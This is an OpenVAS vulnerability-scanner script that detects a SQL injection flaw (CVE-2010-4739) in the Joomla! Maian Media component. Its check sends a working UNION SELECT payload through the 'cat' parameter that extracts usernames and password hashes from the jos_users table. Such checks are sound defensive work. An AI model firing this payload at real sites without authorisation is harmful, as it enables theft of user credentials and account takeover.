###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_maian_media_comp_sql_inj_vuln.nasl 11997 2018-10-20 11:59:41Z mmartin $
#
# Joomla! com_maianmedia Component 'cat' Parameter SQL Injection Vulnerability
#
# Authors:
# Veerendra G.G <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.800199");
  script_version("$Revision: 11997 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-02-17 16:08:28 +0100 (Thu, 17 Feb 2011)");
  script_cve_id("CVE-2010-4739");
  script_bugtraq_id(44877);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Joomla! com_maianmedia Component 'cat' Parameter SQL Injection Vulnerability");


  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("joomla/installed");
  script_tag(name:"impact", value:"Successful exploitation will allow attacker to perform SQL Injection attack
  and gain sensitive information.");
  script_tag(name:"affected", value:"Joomla! Are Times Maian Media Component");
  script_tag(name:"insight", value:"The flaws are caused by improper validation of user-supplied input via the
  'cat' parameter to 'index.php', which allows attackers to manipulate SQL
  queries by injecting arbitrary SQL code.");
  script_tag(name:"solution", value:"An Update is available from vendor.");
  script_tag(name:"summary", value:"This host is installed with Joomla! with Maian Media Silver
  Component and is prone to multiple SQL injection vulnerabilities.");
  script_xref(name:"URL", value:"http://secunia.com/advisories/42284");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/15555/");
  script_xref(name:"URL", value:"http://www.aretimes.com/index.php?option=com_content&view=category&layout=blog&id=40&Itemid=113");

  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!port){
  exit(0);
}

if(!dir = get_dir_from_kb(port:port,app:"joomla")) {
  exit(0);
}

url = string(dir, "/index.php?option=com_maianmedia&view=music&cat=" +
                  "-9999+union+all+select+1,2,group_concat(name,char" +
                  "(58),username,char(58),usertype,char(58),password)" +
                  ",4,5,6,7,8,9,10,11,12,13,14,15,16,17+from+jos_users--");

if(http_vuln_check(port:port, url:url, pattern:'Administrator:admin:' +
                   'Super Administrator:', check_header: TRUE)){
  security_message(port);
}
